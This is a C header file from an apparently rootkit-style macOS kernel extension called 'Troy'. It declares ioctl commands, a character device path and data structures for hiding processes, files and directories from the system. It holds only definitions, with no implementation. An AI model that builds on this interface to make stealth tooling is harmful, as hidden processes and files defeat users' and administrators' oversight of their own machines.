//
//  configure.h
//  Troy
//
//  Created by Axis on 15/5/6.
//  Copyright (c) 2015年 Axis. All rights reserved.
//

#ifndef Troy_configure_h
#define Troy_configure_h

#include <sys/ioctl.h>
#include <sys/queue.h>

#pragma pack(8)
typedef enum
{
    TROY_DIR=1,
    TROY_FILE,
    TROY_PROCESS
}TROY_TYPE;

typedef struct _troy_hide_object
{
    TROY_TYPE objec_type;
    char *name;
    uint64_t name_len;
}troy_hide_object;
#pragma pack()

//TAILQ_HEAD(troy_array_entry, _troy_hide_object);    //this is the array

#pragma mark - DEVICE CMD
#define MAGIC_NUM 'a'
#define TROY_CMD_HIDE_PROCESS _IOWR(MAGIC_NUM, 1, troy_hide_object)
#define TROY_CMD_HIDE_FILE _IOWR(MAGIC_NUM, 2, troy_hide_object)
#define TROY_CMD_HIDE_DIR _IOWR(MAGIC_NUM, 3, troy_hide_object)

#pragma mark - ERROR CODE
#define TROY_SUCCESS 1
#define TROY_ERROR_BASIC 0
#define TROY_ERROR_NOT_MATCH                    TROY_ERROR_BASIC-1
#define TROY_ERROR_INVALID_PARAMETER            TROY_ERROR_BASIC-2
#define TROY_ERROR_NOMEM                        TROY_ERROR_BASIC-3
#define TROY_ERROR_DATA_LENGTH_INVALID          TROY_ERROR_BASIC-4
#define TROY_ERROR_HIDE_ARRAY_IS_EMPRY          TROY_ERROR_BASIC-5

#pragma mark - character device name & absolute path
#define TROY_DEV_NAME "troy_dev"
#define TROY_ABSOLUTE_DEV_PATH "/dev/"TROY_DEV_NAME

#pragma mark - CONFIGURE
#define DEBUG_MODE 1

#pragma mark - align-level

#pragma mark - 
#define SAFE_FREE(ptr)     \
        do {               \
            _FREE((ptr), M_TEMP);    \
            (ptr)=NULL;     \
        }while(0)

/*#define PAD_(t)
#if LITTLE_ENDIAN
#define PADL_(t) 0
#define PADR_(t) PAD_(t)
#else
#define PADL(t) PAD_(t)
#define PADR_(t) PAD_(t)
#endif*/

#endif
